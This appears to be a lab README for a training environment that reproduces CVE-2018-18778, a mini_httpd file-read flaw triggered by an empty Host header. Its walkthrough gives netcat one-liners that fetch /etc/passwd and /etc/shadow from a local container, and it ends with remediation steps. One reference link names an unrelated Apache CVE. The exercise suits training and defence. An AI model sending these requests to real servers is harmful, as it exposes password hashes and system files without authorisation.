# ACME mini_httpd Virtual Host Traversal & Arbitrary File Read (CVE-2018-18778)

## Overview

mini_httpd is a small, lightweight HTTP server implemented by ACME Labs and embedded inside many legacy network appliances and routers. Vulnerability CVE-2018-18778 occurs when virtual hosting is enabled. If an incoming HTTP request specifies an empty Host header, the server constructs file path lookups directly from the root directory instead of the configured document root, allowing arbitrary file retrieval.

- **Service Access**: `http://localhost:8150/`
- **Default Credentials**: `Unauthenticated`
- **Docker Shortcut**: `./lab start mini-httpd-traversal`
- **Container Name**: `cyberlab_04_mini_httpd_traversal`
- **RAM Footprint**: ~50M

---

## Exploitation Walkthrough

### 1. Send HTTP Request with Empty Host Header

```bash
printf 'GET /etc/passwd HTTP/1.1\r\nHost: \r\n\r\n' | nc localhost 8150
```

### 2. Read Sensitive Shadow File

```bash
printf 'GET /etc/shadow HTTP/1.1\r\nHost: \r\n\r\n' | nc localhost 8150
```

### 3. Verify File Leakage

```bash
# Output contains root password hashes and system accounts.
```

---

## Defensive Remediation & Hardening

1. Upgrade mini_httpd to version 1.30 or newer.
2. Disable virtual hosting mode (-v) in server startup flags.
3. Enforce strict Host header validation in frontend reverse proxies.

---

## Video Walkthroughs & Technical References

- [Bugcrowd Security Flash - Apache CVE 2021-41773](https://www.youtube.com/watch?v=x0Bk7nqeB4k)
- [mini_httpd CVE-2018-18778 Advisory](https://acme.com/software/mini_httpd/)
- [Vulhub mini_httpd Environment](https://vulhub.org/#/environments/mini_httpd/CVE-2018-18778/)
